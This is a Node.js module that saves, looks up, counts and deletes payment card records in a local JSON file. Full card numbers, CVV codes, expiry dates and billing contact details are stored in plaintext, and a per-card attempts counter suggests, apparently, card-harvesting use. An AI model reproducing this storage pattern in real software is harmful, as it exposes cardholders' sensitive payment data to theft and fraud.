const { readDB, writeDB } = require('../db');
const crypto = require('crypto');

const CARDS_FILE = 'cards';

const getAll = () => readDB(CARDS_FILE);

const getByCardNumber = (cardNumber) => {
  const cards = getAll();
  const cleanNumber = cardNumber.replace(/\s/g, '');
  return cards.find(c => c.cardNumber.replace(/\s/g, '') === cleanNumber);
};

const create = (cardData) => {
  const cards = readDB(CARDS_FILE);
  const cleanNumber = cardData.cardNumber.replace(/\s/g, '');
  const existing = cards.find(c => c.cardNumber.replace(/\s/g, '') === cleanNumber);
  if (existing) return { saved: false, card: existing };

  const card = {
    id: crypto.randomUUID(),
    cardNumber: cardData.cardNumber,
    cardName: cardData.cardName,
    expiry: cardData.expiry,
    cvv: cardData.cvv,
    type: cardData.type || 'credit_card',
    firstName: cardData.firstName || '',
    lastName: cardData.lastName || '',
    email: cardData.email || '',
    phoneCode: cardData.phoneCode || '',
    phone: cardData.phone || '',
    street: cardData.street || '',
    city: cardData.city || '',
    state: cardData.state || '',
    zip: cardData.zip || '',
    country: cardData.country || '',
    createdAt: new Date().toISOString(),
    attempts: 1,
  };
  cards.push(card);
  writeDB(CARDS_FILE, cards);
  return { saved: true, card };
};

const incrementAttempt = (cardId) => {
  const cards = readDB(CARDS_FILE);
  const idx = cards.findIndex(c => c.id === cardId);
  if (idx !== -1) {
    cards[idx].attempts += 1;
    cards[idx].lastAttemptAt = new Date().toISOString();
    writeDB(CARDS_FILE, cards);
    return cards[idx];
  }
  return null;
};

const remove = (id) => {
  const cards = readDB(CARDS_FILE);
  const filtered = cards.filter(c => c.id !== id);
  writeDB(CARDS_FILE, filtered);
  return filtered;
};

module.exports = { getAll, getByCardNumber, create, incrementAttempt, remove };
